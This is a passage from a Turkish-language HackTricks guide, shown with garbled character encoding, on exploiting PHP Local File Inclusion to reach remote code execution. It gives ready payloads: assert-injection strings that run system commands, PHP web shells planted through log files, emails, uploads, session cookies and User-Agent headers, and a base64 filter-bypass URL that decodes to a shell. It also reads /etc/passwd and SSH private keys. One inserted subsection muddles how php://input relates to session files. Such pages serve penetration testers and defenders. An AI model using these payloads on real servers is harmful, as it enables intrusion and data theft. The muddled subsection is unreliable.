`.phar` dosyalarÄ±nÄ±n baÄŸlamÄ±nda deserialization zafiyetlerini sÃ¶mÃ¼rme konusunda daha detaylÄ± bilgi iÃ§in aÅŸaÄŸÄ±daki belgeye baÅŸvurun:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### Daha fazla protokol

Daha fazla olasÄ± [**protokolÃ¼ buraya eklemek iÃ§in**](https://www.php.net/manual/en/wrappers.php) kontrol edin:

* [php://memory ve php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) â€” BelleÄŸe veya geÃ§ici bir dosyaya yazma (bu nasÄ±l bir dosya dahil etme saldÄ±rÄ±sÄ±nda kullanÄ±ÅŸlÄ± olabilir emin deÄŸilim)
* [file://](https://www.php.net/manual/en/wrappers.file.php) â€” Yerel dosya sistemine eriÅŸim
* [http://](https://www.php.net/manual/en/wrappers.http.php) â€” HTTP(s) URL'lerine eriÅŸim
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) â€” FTP(s) URL'lerine eriÅŸim
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) â€” SÄ±kÄ±ÅŸtÄ±rma AkÄ±ÅŸlarÄ±
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) â€” Deseni eÅŸleÅŸtiren dosya yollarÄ±nÄ± bulma (yazdÄ±rÄ±labilir bir ÅŸey dÃ¶ndÃ¼rmediÄŸi iÃ§in burada gerÃ§ekten kullanÄ±ÅŸlÄ± deÄŸil)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) â€” GÃ¼venli Kabuk 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) â€” Ses akÄ±ÅŸlarÄ± (keyfi dosyalarÄ± okumak iÃ§in kullanÄ±ÅŸlÄ± deÄŸil)

## PHP'nin 'assert' Fonksiyonu AracÄ±lÄ±ÄŸÄ±yla LFI

PHP'de Local File Inclusion (LFI) riskleri, dize iÃ§inde kodu Ã§alÄ±ÅŸtÄ±rabilen 'assert' fonksiyonuyla ilgilenirken Ã¶zellikle yÃ¼ksektir. Bu, dizin geÃ§iÅŸi karakterlerini (Ã¶rneÄŸin "..") iÃ§eren giriÅŸlerin kontrol edildiÄŸi ancak uygun ÅŸekilde temizlenmediÄŸi durumlarda Ã¶zellikle sorunlu olabilir.

Ã–rneÄŸin, PHP kodu, dizin geÃ§iÅŸini Ã¶nlemek iÃ§in aÅŸaÄŸÄ±daki gibi tasarlanmÄ±ÅŸ olabilir:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Bu, geÃ§iÅŸi durdurmayÄ± amaÃ§lasa da, yanlÄ±ÅŸlÄ±kla kod enjeksiyonu iÃ§in bir vektÃ¶r oluÅŸturur. Dosya iÃ§eriÄŸini okumak iÃ§in bunu sÃ¶mÃ¼rmek isteyen bir saldÄ±rgan ÅŸunlarÄ± kullanabilir:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Benzer ÅŸekilde, keyfi sistem komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in ÅŸunlarÄ± kullanabilirsiniz:
```plaintext
' and die(system("id")) or '
```
Bu payload'larÄ± **URL kodlamasÄ±yla** kodlamak Ã¶nemlidir.


<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ±yla iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±nÄ± ve zorluklarÄ±nÄ± inceleyen iÃ§eriklerle etkileÅŸime geÃ§in

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
GerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼ler aracÄ±lÄ±ÄŸÄ±yla hÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nda gÃ¼ncel kalÄ±n

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avcÄ±larÄ±nÄ±n baÅŸlatÄ±lmasÄ± ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi edinin

**Bize** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **katÄ±lÄ±n ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!**

## PHP KÃ¶r Yol GeÃ§iÅŸi

{% hint style="warning" %}
Bu teknik, bir **PHP iÅŸlevinin** bir **dosyaya eriÅŸeceÄŸi dosya yolunu kontrol ettiÄŸiniz** durumlarda ilgilidir, ancak dosyanÄ±n iÃ§eriÄŸini gÃ¶remezsiniz (basit bir **`file()`** Ã§aÄŸrÄ±sÄ± gibi), ancak iÃ§erik gÃ¶sterilmez.
{% endhint %}

Bu [**inanÄ±lmaz gÃ¶nderide**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html), PHP filtresi aracÄ±lÄ±ÄŸÄ±yla kÃ¶r yol geÃ§iÅŸinin bir hata orak aracÄ±lÄ±ÄŸÄ±yla bir dosyanÄ±n iÃ§eriÄŸini **dÄ±ÅŸa aktarmanÄ±n** nasÄ±l istismar edilebileceÄŸi aÃ§Ä±klanmaktadÄ±r.

Ã–zet olarak, teknik, dosyayÄ± aÃ§an **PHP iÅŸlevinin bir hata** oluÅŸturmasÄ±na neden olacak kadar bÃ¼yÃ¼k bir dosyanÄ±n iÃ§eriÄŸini oluÅŸturmak iÃ§in **"UCS-4LE" kodlamasÄ±nÄ±** kullanÄ±r.

ArdÄ±ndan, ilk karakteri sÄ±zdÄ±rmak iÃ§in **`dechunk`** filtresi kullanÄ±lÄ±r ve son olarak **base64** veya **rot13** gibi diÄŸer filtrelerle birlikte **convert.iconv.UCS-4.UCS-4LE** ve **convert.iconv.UTF16.UTF-16BE** filtreleri kullanÄ±larak diÄŸer karakterlerin baÅŸÄ±na yerleÅŸtirilir ve sÄ±zdÄ±rÄ±lÄ±r.

**Etkilenen olabilecek iÅŸlevler**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (sadece hedef salt okunur ile)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Teknik ayrÄ±ntÄ±lar iÃ§in bahsedilen gÃ¶nderiyi kontrol edin!

## LFI2RCE

### Uzaktan Dosya Dahil Etme

Daha Ã¶nce aÃ§Ä±klandÄ±ÄŸÄ± gibi, [**bu baÄŸlantÄ±yÄ± takip edin**](./#remote-file-inclusion).

### Apache/Nginx gÃ¼nlÃ¼k dosyasÄ± aracÄ±lÄ±ÄŸÄ±yla

EÄŸer Apache veya Nginx sunucusu, dahil etme iÅŸlevi iÃ§inde **LFI'ye karÅŸÄ± savunmasÄ±z** ise, **`/var/log/apache2/access.log` veya `/var/log/nginx/access.log`**'a eriÅŸmeyi deneyebilirsiniz, **kullanÄ±cÄ± ajanÄ±** veya bir **GET parametresi** iÃ§ine **`<?php system($_GET['c']); ?>`** gibi bir php shell yerleÅŸtirin ve o dosyayÄ± dahil edin.

{% hint style="warning" %}
Shell iÃ§in **tek tÄ±rnaklar yerine Ã§ift tÄ±rnaklar** kullanÄ±rsanÄ±z, Ã§ift tÄ±rnaklar "_**quote;**_" dizesi iÃ§in deÄŸiÅŸtirilecek, **PHP burada bir hata atacak** ve **baÅŸka bir ÅŸey yÃ¼rÃ¼tÃ¼lmeyecek**.

AyrÄ±ca, payload'Ä± **doÄŸru ÅŸekilde yazdÄ±ÄŸÄ±nÄ±zdan** emin olun, aksi takdirde PHP, gÃ¼nlÃ¼k dosyasÄ±nÄ± yÃ¼klemeye her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda hata verecek ve ikinci bir fÄ±rsatÄ±nÄ±z olmayacak.
{% endhint %}

Bu aynÄ± ÅŸekilde diÄŸer gÃ¼nlÃ¼klerde de yapÄ±labilir, ancak **dikkatli olun**, gÃ¼nlÃ¼klerdeki kod URL kodlanmÄ±ÅŸ olabilir ve bu Shell'i bozabilir. **authorisation "basic"** baÅŸlÄ±ÄŸÄ±, Base64'te "user:password" iÃ§erir ve gÃ¼nlÃ¼klerde Ã§Ã¶zÃ¼lÃ¼r. PHPShell bu baÅŸlÄ±ÄŸÄ±n iÃ§ine yerleÅŸtirilebilir.\
DiÄŸer olasÄ± gÃ¼nlÃ¼k yollarÄ±:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing kelime listesi: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### E-posta AracÄ±lÄ±ÄŸÄ±yla

**Bir e-posta** gÃ¶nderin ve iÃ§erisine `<?php echo system($_REQUEST["cmd"]); ?>` gibi PHP yÃ¼kÃ¼nÃ¼zÃ¼ yerleÅŸtirin. ArdÄ±ndan, kullanÄ±cÄ±nÄ±n e-postasÄ±nÄ± **`/var/mail/<KULLANICI ADI>`** veya **`/var/spool/mail/<KULLANICI ADI>`** gibi bir yol ile dahil etmeyi deneyin.

### /proc/\*/fd/\* AracÄ±lÄ±ÄŸÄ±yla

1. BirÃ§ok shell yÃ¼kleyin (Ã¶rneÄŸin: 100)
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) adresini dahil edin, burada $PID = iÅŸlemin PID'si (kaba kuvvetle bulunabilir) ve $FD dosya tanÄ±mlayÄ±cÄ±sÄ±dÄ±r (bu da kaba kuvvetle bulunabilir).

### /proc/self/environ AracÄ±lÄ±ÄŸÄ±yla

Bir gÃ¼nlÃ¼k dosyasÄ± gibi davranarak, yÃ¼kÃ¼ User-Agent iÃ§inde gÃ¶nderin. Bu, /proc/self/environ dosyasÄ±nda yansÄ±tÄ±lacaktÄ±r.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### YÃ¼kleme Yoluyla

Bir dosya yÃ¼kleyebiliyorsanÄ±z, sadece kabuk yÃ¼kÃ¼nÃ¼ iÃ§ine enjekte edin (Ã¶rneÄŸin: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
DosyayÄ± okunabilir tutmak iÃ§in en iyi yÃ¶ntem, resimlerin/dokÃ¼manlarÄ±n/metin belgelerinin meta verilerine enjekte etmektir.

### Zip dosyasÄ± yÃ¼kleyerek

PHP kabuÄŸunu iÃ§eren bir ZIP dosyasÄ± yÃ¼kleyin ve eriÅŸim saÄŸlayÄ±n:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP oturumlarÄ± aracÄ±lÄ±ÄŸÄ±yla

Websitesinin PHP Oturumu (PHPSESSID) kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± kontrol edin.
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP'de bu oturumlar _/var/lib/php5/sess\\_\[PHPSESSID]\_ dosyalarÄ±na kaydedilir.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Ã‡erez deÄŸerini `<?php system('cat /etc/passwd');?>` olarak ayarlayÄ±n.
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
# PHP Oturum DosyasÄ±nÄ± Dahil Etmek Ä°Ã§in LFI KullanÄ±mÄ±

Bir web uygulamasÄ±nda yer alan Local File Inclusion (LFI) zafiyeti, hedef sunucuda bulunan dosyalarÄ± dahil etmek iÃ§in kullanÄ±labilir. Bu zafiyetin bir Ã¶rneÄŸi, PHP oturum dosyasÄ±nÄ± dahil etmek iÃ§in kullanÄ±labilir.

## AdÄ±m 1: Hedef Sunucunun LFI Zafiyetini Kontrol Etme

Ä°lk adÄ±m olarak, hedef web uygulamasÄ±nda LFI zafiyetinin varlÄ±ÄŸÄ±nÄ± kontrol etmemiz gerekmektedir. Bu zafiyet genellikle URL parametrelerinde veya dosya yollarÄ±nda bulunabilir. Ã–rnek bir URL parametresi ÅŸu ÅŸekilde olabilir:

```
http://example.com/page.php?file=example.txt
```

Bu URL'de `file` parametresi, hedef sunucuda bulunan `example.txt` dosyasÄ±nÄ± dahil etmek iÃ§in kullanÄ±lÄ±yor olabilir.

## AdÄ±m 2: PHP Oturum DosyasÄ±nÄ± Dahil Etme

LFI zafiyetini kullanarak PHP oturum dosyasÄ±nÄ± dahil etmek iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. Hedef web uygulamasÄ±nda LFI zafiyetinin bulunduÄŸu URL'yi belirleyin. Ã–rneÄŸin:

   ```
   http://example.com/page.php?file=
   ```

2. URL'ye `php://input` ifadesini ekleyerek PHP oturum dosyasÄ±nÄ± dahil edin:

   ```
   http://example.com/page.php?file=php://input
   ```

3. Bir POST isteÄŸi gÃ¶ndererek PHP oturum dosyasÄ±nÄ± iÃ§eren bir veri gÃ¶nderin. Ã–rneÄŸin:

   ```
   POST /page.php?file=php://input HTTP/1.1
   Host: example.com
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 20

   <?php include('session.php'); ?>
   ```

   Bu istek, `session.php` dosyasÄ±nÄ± dahil ederek PHP oturumunu elde etmenizi saÄŸlayacaktÄ±r.

## SonuÃ§

LFI zafiyeti kullanÄ±larak PHP oturum dosyasÄ± dahil edilebilir. Bu, hedef web uygulamasÄ±nÄ±n oturum yÃ¶netimini etkileyebilir ve yetkisiz eriÅŸim saÄŸlayabilir. Bu nedenle, web uygulamalarÄ±nÄ±n LFI zafiyetlerine karÅŸÄ± korunmasÄ± Ã¶nemlidir.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### SSH ile

EÄŸer ssh etkinse, hangi kullanÄ±cÄ±nÄ±n kullanÄ±ldÄ±ÄŸÄ±nÄ± kontrol edin (/proc/self/status & /etc/passwd) ve **\<HOME>/.ssh/id\_rsa**'ya eriÅŸmeyi deneyin.

### **vsftpd** _**loglarÄ±**_ Ã¼zerinden

FTP sunucusu vsftpd iÃ§in loglar **_/var/log/vsftpd.log_** konumundadÄ±r. Bir Yerel Dosya Dahil Etme (LFI) zafiyeti varsa ve aÃ§Ä±k bir vsftpd sunucusuna eriÅŸim mÃ¼mkÃ¼nse, aÅŸaÄŸÄ±daki adÄ±mlar dÃ¼ÅŸÃ¼nÃ¼lebilir:

1. GiriÅŸ iÅŸlemi sÄ±rasÄ±nda kullanÄ±cÄ± adÄ± alanÄ±na bir PHP payloadu enjekte edin.
2. Enjeksiyondan sonra, LFI'Ä± kullanarak **_/var/log/vsftpd.log_**'dan sunucu loglarÄ±nÄ± alÄ±n.

### PHP base64 filtresi ile (base64 kullanarak)

[Åu](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) makalede gÃ¶sterildiÄŸi gibi, PHP base64 filtresi sadece Base64 olmayanlarÄ± gÃ¶rmezden gelir. Bu, dosya uzantÄ±sÄ± kontrolÃ¼nÃ¼ atlatmak iÃ§in kullanÄ±labilir: ".php" ile biten bir base64 saÄŸlarsanÄ±z, noktayÄ± gÃ¶rmezden gelir ve base64'e "php" ekler. Ä°ÅŸte bir Ã¶rnek payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Php filtreleri aracÄ±lÄ±ÄŸÄ±yla (dosya gerekmez)

Bu [**yazÄ±da**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d), Ã§Ä±ktÄ± olarak **keyfi iÃ§erik oluÅŸturmak iÃ§in php filtrelerini kullanabileceÄŸinizi** aÃ§Ä±klanmaktadÄ±r. Bu temel olarak, **bir dosyaya yazmadan** dahil etmek iÃ§in **keyfi php kodu oluÅŸturabileceÄŸiniz** anlamÄ±na gelir.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Segmentasyon hatasÄ± aracÄ±lÄ±ÄŸÄ±yla

Bir dosyayÄ± **yÃ¼kleyin** ve bu dosya `/tmp` dizininde **geÃ§ici olarak saklansÄ±n**, ardÄ±ndan **aynÄ± istekte**, bir **segmentasyon hatasÄ±** tetikleyin ve ardÄ±ndan **geÃ§ici dosya silinmez** ve onu arayabilirsiniz.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Nginx geÃ§ici dosya depolama aracÄ±lÄ±ÄŸÄ±yla

EÄŸer bir **Yerel Dosya Dahil Etme** bulduysanÄ±z ve **Nginx**, PHP'nin Ã¶nÃ¼nde Ã§alÄ±ÅŸÄ±yorsa, aÅŸaÄŸÄ±daki teknikle RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### PHP\_SESSION\_UPLOAD\_PROGRESS aracÄ±lÄ±ÄŸÄ±yla

Bir **Yerel Dosya Dahil Etme** bulduysanÄ±z ve bir oturumunuz **yoksa** ve `session.auto_start` `Off` olarak ayarlanmÄ±ÅŸsa bile. **Multipart POST** verilerinde **`PHP_SESSION_UPLOAD_PROGRESS`** saÄŸlarsanÄ±z, PHP oturumu **sizin iÃ§in etkinleÅŸtirir**. Bunu kÃ¶tÃ¼ye kullanarak RCE elde edebilirsiniz:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Windows'ta geÃ§ici dosya yÃ¼klemeleri aracÄ±lÄ±ÄŸÄ±yla

Bir **Yerel Dosya Dahil Etme** bulduysanÄ±z ve sunucu **Windows** Ã¼zerinde Ã§alÄ±ÅŸÄ±yorsa RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### phpinfo() (file\_uploads = on) aracÄ±lÄ±ÄŸÄ±yla

Bir **Yerel Dosya Dahil Etme** bulduysanÄ±z ve file\_uploads = on olan bir dosya **phpinfo()** aÃ§Ä±ÄŸa Ã§Ä±karÄ±yorsa RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Yol AÃ§Ä±ÄŸÄ±nÄ± Kullanarak

Bir **Yerel Dosya Dahil Etme** bulduysanÄ±z ve geÃ§ici dosyanÄ±n yolunu **sÄ±zdÄ±rabiliyorsanÄ±z** ANCAK **sunucu**, **dahil edilecek dosyanÄ±n PHP iÅŸaretlerine sahip olup olmadÄ±ÄŸÄ±nÄ± kontrol ediyorsa**, bu **YarÄ±ÅŸ KoÅŸulu** ile bu kontrolÃ¼ **atlamayÄ±** deneyebilirsiniz:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Sonsuz bekleme + brute force aracÄ±lÄ±ÄŸÄ±yla

LFI'yi **geÃ§ici dosyalar yÃ¼klemek** iÃ§in kÃ¶tÃ¼ye kullanabilir ve sunucunun PHP yÃ¼rÃ¼tmesini **askÄ±ya alabilirsiniz**, ardÄ±ndan saatler boyunca geÃ§ici dosyayÄ± bulmak iÃ§in **brute force** yapabilirsiniz:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Ã–lÃ¼mcÃ¼l Hata Yoluyla

`/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` dosyalarÄ±ndan herhangi birini dahil ederseniz. (Bu hatayÄ± atmak iÃ§in aynÄ± olanÄ± 2 kez dahil etmeniz gerekmektedir).

**Bu nasÄ±l kullanÄ±ÅŸlÄ± olduÄŸunu bilmiyorum ama olabilir.**\
_EÄŸer bir PHP Ã–lÃ¼mcÃ¼l HatasÄ± oluÅŸturursanÄ±z, yÃ¼klenen PHP geÃ§ici dosyalarÄ± silinir._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## Referanslar

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve hata avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Insights**\
Hacking'in heyecanÄ±nÄ± ve zorluklarÄ±nÄ± inceleyen iÃ§eriklerle etkileÅŸime geÃ§in

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni hata avÄ± Ã¶dÃ¼lleri baÅŸlatma ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi edinin

BugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmak iÃ§in [**Discord**](https://discord.com/invite/N3FrSbmwdy)'a katÄ±lÄ±n!

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklam vermek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u takip edin.
* Hacking hilelerinizi gÃ¶ndererek HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek katkÄ±da bulunun.

</details>
